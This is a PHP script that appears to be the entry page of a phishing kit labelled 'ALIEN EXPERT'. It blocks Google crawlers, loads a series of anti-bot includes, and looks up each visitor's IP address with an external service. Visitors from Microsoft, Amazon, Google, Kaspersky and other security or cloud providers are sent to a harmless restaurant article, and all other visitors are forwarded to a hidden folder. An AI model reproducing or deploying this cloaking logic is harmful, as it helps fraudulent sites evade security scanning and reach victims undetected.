<?php
/*
  
  ALIEN EXPERT

*/
session_start();
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//include 'W/antifuck.php';
require 'W/Bots/anti1.php';
require 'W/Bots/anti2.php';
require 'W/Bots/anti3.php';
require 'W/Bots/anti4.php';
require 'W/Bots/anti5.php';
require 'W/Bots/anti6.php';
require 'W/Bots/anti7.php';
require 'W/Bots/anti8.php';
$client  = @$_SERVER["HTTP_CLIENT_IP"];
$forward = @$_SERVER["HTTP_X_FORWARDED_FOR"];
$remote  = @$_SERVER["REMOTE_ADDR"];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION["_ip_"]  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION["_ip_"]  = $forward;
}
else{
    $_SESSION["_ip_"]  = $remote;
}
$getdetails = "https://extreme-ip-lookup.com/json/" . $_SESSION["_ip_"];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION["isp"] = $isp   = $details->isp;
if($_SESSION["isp"] == "Microsoft Corporation" || $_SESSION["isp"] == "Amazon.com"  || $_SESSION["isp"] == "SoftLayer Technologies Inc." || $_SESSION["isp"] == "Google LLC" || $_SESSION["isp"] == "Kvchosting.com LLC" || $_SESSION["isp"] == "Kaspersky Lab AO" || $_SESSION["isp"] == "Amazon Technologies Inc." || $_SESSION["isp"] == "Amazon Technologies Inc.") {	
        header("Location: https://www.thebalancesmb.com/how-to-open-a-new-restaurant-2888644");
		  }
 else {
	header("Location: W");
 }
?>